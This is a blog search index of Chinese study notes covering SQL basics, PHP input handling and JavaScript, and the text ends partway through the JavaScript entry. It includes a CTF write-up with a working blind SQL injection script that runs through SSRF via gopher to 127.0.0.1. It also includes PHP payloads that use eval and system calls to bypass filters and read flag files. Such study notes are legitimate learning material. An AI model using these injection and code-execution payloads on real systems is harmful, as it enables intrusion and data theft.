<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2022/01/13/sql-1/"/>
    <url>/2022/01/13/sql-1/</url>
    
    <content type="html"><![CDATA[<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> 列名称 <span class="hljs-keyword">FROM</span> 表名称<br><span class="hljs-keyword">SELECT</span> Company <span class="hljs-keyword">FROM</span> Orders<br><br># Company 列中仅选取唯一不同的值<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> Company <span class="hljs-keyword">FROM</span> Orders <br><br>#如果只希望选取居住在城市 &quot;Beijing&quot; 中的人，我们需要向 <span class="hljs-keyword">SELECT</span> 语句添加 <span class="hljs-keyword">WHERE</span> 子句：<span class="hljs-keyword">where</span>还可以添加各种运算符控制查询条件<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> City<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Beijing&#x27;</span>，字符加引号，数字不要加<br><br><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> FirstName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">AND</span> LastName<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Persons <span class="hljs-keyword">WHERE</span> firstname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Thomas&#x27;</span> <span class="hljs-keyword">OR</span> lastname<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Carter&#x27;</span><br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>  用于根据指定列队结果进行排序，默认按照升序，降序用   <span class="hljs-keyword">desc</span><br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company<br><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company <span class="hljs-keyword">desc</span><br><br>#向表中插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> 表名称 <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br>#向表中指定列插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (列<span class="hljs-number">1</span>, 列<span class="hljs-number">2</span>,...) <span class="hljs-keyword">VALUES</span> (值<span class="hljs-number">1</span>, 值<span class="hljs-number">2</span>,....)<br><br><br>UPDATE 表名称 <span class="hljs-keyword">SET</span> 列名称 <span class="hljs-operator">=</span> 新值 <span class="hljs-keyword">WHERE</span> 列名称 <span class="hljs-operator">=</span> 某值<br>UPDATE Person <span class="hljs-keyword">SET</span> Address <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Zhongshan 23&#x27;</span>, City <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Nanjing&#x27;</span><br><span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span><br><br><br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Person <span class="hljs-keyword">WHERE</span> LastName <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Wilson&#x27;</span> <br>#可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：<br><span class="hljs-keyword">DELETE</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> table_name<br><br><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">like</span> <span class="hljs-comment">-----筛选列中的元素</span><br><span class="hljs-keyword">where</span> city <span class="hljs-keyword">not</span> <span class="hljs-keyword">like</span> <span class="hljs-comment">-----模糊查找</span><br><span class="hljs-operator">%</span>代表<span class="hljs-number">0</span>个或者多个字符<br>_代表一个字符<br>[charlist]字符列中任何一个字符<br>[<span class="hljs-operator">^</span>charlist]不在字符列中的任何字符<br><br><br><span class="hljs-keyword">between</span>:<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br>#范围之外：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">BETWEEN</span> value1 <span class="hljs-keyword">AND</span> value2<br><br><br>#换别名显示：<br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">AS</span> alias_name<br><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">AS</span> alias_name <span class="hljs-keyword">FROM</span> table_name<br><br><br>#从两个表中查询信息并显示在一起，最后一行使俩id相等显示<br><span class="hljs-keyword">SELECT</span> Persons.LastName, Persons.FirstName, Orders.OrderNo<br><span class="hljs-keyword">FROM</span> Persons, Orders<br><span class="hljs-keyword">WHERE</span> Persons.Id_P <span class="hljs-operator">=</span> Orders.Id_P <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>-study</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ablindsql</title>
    <link href="/2022/01/10/ablindsql/"/>
    <url>/2022/01/10/ablindsql/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><br><br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload =\</span><br><span class="hljs-comment"># &quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-comment"># Host: xxxx</span><br><span class="hljs-comment"># Content-Length: 48</span><br><span class="hljs-comment"># Cache-Control: max-age=0</span><br><span class="hljs-comment"># Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-comment"># Origin: xxxx</span><br><span class="hljs-comment"># Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment"># Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-comment"># Referer: xxxxx</span><br><span class="hljs-comment"># Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment"># Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment"># Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-comment"># Connection: close</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br><span class="hljs-comment"># #爆数据库名</span><br><span class="hljs-comment"># basename=&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(1,4):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert=&quot;id=1/**/and/**/ascii(substr(database(),%d,1))=%d&quot; %(i,number)</span><br><span class="hljs-comment">#         # insert = &quot;id=1/**/and/**/ascii(substr(database(),1,1))=&#123;&#125;&quot;.format((str)(number))</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;ok&#x27;,chr(number))</span><br><span class="hljs-comment">#             basename=basename+chr(number)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br>basename=<span class="hljs-string">&#x27;rua&#x27;</span><br><br><span class="hljs-comment">#爆表名</span><br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /xxxxx HTTP/1.1</span><br><span class="hljs-string">Host: xxxxxx</span><br><span class="hljs-string">Content-Length: 77</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="hljs-string">Origin: xxxxxx</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Referer: xxxxxxx</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Cookie: PHPSESSID=q47apnptnfqe59r2vuommr903a</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># i=1</span><br><span class="hljs-comment"># while(i&lt;10):</span><br><span class="hljs-comment">#     number = 65</span><br><span class="hljs-comment">#     while(number&lt;123):</span><br><span class="hljs-comment">#         insert = &quot;id=1/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),%d,1))=%d&quot;%(i,number)</span><br><span class="hljs-comment">#         # print(insert)</span><br><span class="hljs-comment">#         payloads=payload+&#x27;\n&#x27;+insert+&#x27;\n&#x27;</span><br><span class="hljs-comment">#         # print(payload)</span><br><span class="hljs-comment">#         #注意后面一定要有回车，回车结尾表示http请求结束</span><br><span class="hljs-comment">#         tmp = urllib.parse.quote(payloads)</span><br><span class="hljs-comment">#         new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class="hljs-comment">#         result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+new</span><br><span class="hljs-comment">#         # 请求网页</span><br><span class="hljs-comment">#         url = &#x27;xxxxxxx&#x27;</span><br><span class="hljs-comment">#         data = &#123;&#x27;url&#x27;: result&#125;</span><br><span class="hljs-comment">#         # print(data)</span><br><span class="hljs-comment">#         req = requests.post(url=url, data=data)</span><br><span class="hljs-comment">#         # print(req.text)</span><br><span class="hljs-comment">#         if(&#x27;meow&#x27; in req.text):</span><br><span class="hljs-comment">#             print(&#x27;yes&#x27;,chr(number),i)</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             number = number + 1</span><br><span class="hljs-comment">#     i=i+1</span><br><span class="hljs-comment"># 114 117 97 rua</span><br><span class="hljs-comment"># print(basename)</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#nothing</span><br>final=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    number=<span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span>(number&lt;<span class="hljs-number">128</span>):<br>        insert = <span class="hljs-string">&quot;id=1/**/and/**/ascii(substr((select/**/flag/**/from/**/rua.flag),%d,1))=%d&quot;</span>%(i,number)<br>        <span class="hljs-comment"># print(insert)</span><br>        payloads=payload+<span class="hljs-string">&#x27;\n&#x27;</span>+insert+<span class="hljs-string">&#x27;\n&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>        tmp = urllib.parse.quote(payloads)<br>        new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>        result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>        <span class="hljs-comment"># 请求网页</span><br>        url = <span class="hljs-string">&#x27;xxxxxxx&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;url&#x27;</span>: result&#125;<br>        <span class="hljs-comment"># print(data)</span><br>        req = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># print(req.text)</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;meow&#x27;</span> <span class="hljs-keyword">in</span> req.text):<br>             <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes&#x27;</span>,<span class="hljs-built_in">chr</span>(number))<br>             final=final+<span class="hljs-built_in">chr</span>(number)<span class="hljs-comment">#+str(i)</span><br>             <span class="hljs-built_in">print</span>(final)<br>             <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            number = number + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(number),<span class="hljs-string">&#x27;no&#x27;</span>)<br><span class="hljs-built_in">print</span>(final)<br></code></pre></td></tr></table></figure><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>算是很开心拿到这一题的flag，虽然很简单，对ssrf有了更深刻的认识，对python简单脚本的编写认识更深了一点，这里说一个web页面请求头content-length，读取自己post提交数据的表单长度，只有大于或者等于post表单长度才能完整的读取post提交的数据，否则数据读不完整，但是，也不能很大，大了的话跑脚本的时候运行速度会很慢，所以自己在写的时候要特别注意length的大小。其次，自己读题审题一定要仔细，这里漏一点，那里漏一点还怎么玩。进而，脚本编写的太朴素，谁都能看懂，效率就慢了点，等我什么时候再重新写一下这个脚本，再多学学才行。</p><p>很感谢kxy同学，今天帮了我很大的忙，对我的提问做出了讲解，讲的很好，下次还来。</p>]]></content>
    
    
    
    <tags>
      
      <tag>-study</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php</title>
    <link href="/2022/01/10/php/"/>
    <url>/2022/01/10/php/</url>
    
    <content type="html"><![CDATA[<p>$data = file_get_contents(“php://input”);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">    php:<span class="hljs-comment">//input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的。 </span><br>    <br> <br><span class="hljs-number">1</span>, php:<span class="hljs-comment">//input 可以读取http entity body中指定长度的值,由Content-Length指定长度,不管是POST方式或者GET方法提交过来的数据。但是，一般GET方法提交数据 时，http request entity body部分都为空。 </span><br><span class="hljs-number">2</span>,php:<span class="hljs-comment">//input 与$HTTP_RAW_POST_DATA读取的数据是一样的，都只读取Content-Type不为multipart/form-data的数据。</span><br>学习笔记<br> <span class="hljs-number">1</span>，Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量<span class="hljs-variable">$_POST</span> <br> <span class="hljs-number">2</span>，PHP不能识别的Content-Type类型的时候，会将http请求包中相应的数据填入变量<span class="hljs-variable">$HTTP_RAW_POST_DATA</span> <br> <span class="hljs-number">3</span>, 只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php:<span class="hljs-comment">//input，否则其它情况都会。填入的长度，由Coentent-Length指定。 </span><br> <span class="hljs-number">4</span>，只有Content-Type为application/x-www-data-urlencoded时，php:<span class="hljs-comment">//input数据才跟$_POST数据相一致。 </span><br> <span class="hljs-number">5</span>，php:<span class="hljs-comment">//input数据总是跟$HTTP_RAW_POST_DATA相同，但是php://input比$HTTP_RAW_POST_DATA更凑效，且不需要特殊设置php.ini </span><br> <span class="hljs-number">6</span>，PHP会将PATH字段的query_path部分，填入全局变量<span class="hljs-variable">$_GET</span>。通常情况下，GET方法提交的http请求，body为空。<br> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">一些获取方式：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>;<br>var_dump(<span class="hljs-variable">$get</span>);<span class="hljs-comment">#array(1) &#123; [&quot;c&quot;]=&gt; string(6) &quot;123123&quot; &#125;</span><br><br><span class="hljs-variable">$cookie</span>=<span class="hljs-variable">$_COOKIE</span>;<br>var_dump(<span class="hljs-variable">$cookie</span>);<span class="hljs-comment"># array(1) &#123; [&quot;Phpstorm-67f2d95b&quot;]=&gt; string(36) &quot;36578afe-712e-4cf0-b3f3-5cf44cc783a5&quot; &#125;</span><br><br><span class="hljs-variable">$requri</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>var_dump(<span class="hljs-variable">$requri</span>);<span class="hljs-comment">#string(10) &quot;/index.php&quot;</span><br><br><span class="hljs-variable">$post</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>var_dump(<span class="hljs-variable">$post</span>);<span class="hljs-comment">// string(22) &quot;a=123123123&amp;Cookie=123&quot;</span><br></code></pre></td></tr></table></figure><p><a href="http://c.biancheng.net/php/">PHP</a> $<em>FILES</em></p><p> 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。</p><p><a href="https://mp.weixin.qq.com/s/UgdVarWXZLFM1CnbaeXm1g">命令代码执行</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//参数逃逸</span><br>?c=<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>];&amp;<span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;ls&#x27;</span>)); <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造不是很懂</span><br><br><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\=|\+|\&#123;|\&#125;|\[|\]|\;|\&#x27;|\&quot;|\,|\&lt;|\&gt;|\.|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>)) &#123;<br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>  &#125;<br>提示payload:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br><br>?c=print_r(get_defined_vars());  <span class="hljs-comment">#拿到所有的变量</span><br><br>在这里使用post请求加入给<span class="hljs-keyword">Array</span>加入一个新的变量phpinfo()再执行<br>?c=print_r(next(get_defined_vars())); 使用next方法拿到下一个变量<br>?c=<span class="hljs-keyword">eval</span>(array_pop((next(get_defined_vars()))); <span class="hljs-comment">#使用array__pop拿到变量再执行</span><br>array_pop()返回数组的最后一个值。如果数组是空的，或者非数组，将返回 <span class="hljs-literal">NULL</span>。<br>        <br>post传值<span class="hljs-number">1</span>=system(<span class="hljs-string">&quot;tac fla?.php&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>-study</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javascript</title>
    <link href="/2022/01/10/javascript/"/>
    <url>/2022/01/10/javascript/</url>
    
    <content type="html"><![CDATA[<p>javascript—study</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!DOCTYPE html&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>lionel<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">//js区分大小写,以分号结尾</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml">    &lt;!---</span></span><br><span class="javascript"><span class="xml">    控制浏览器弹出一个警告框</span></span><br><span class="javascript"><span class="xml">    alert(<span class="hljs-string">&quot;lionel is a handsome boy&quot;</span>);</span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml">    让计算机在页面中输出一个内容</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;wwwwww~~~~&quot;</span>);可以向body中输出一个内容</span></span><br><span class="javascript"><span class="xml">    </span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">console</span>.log(<span 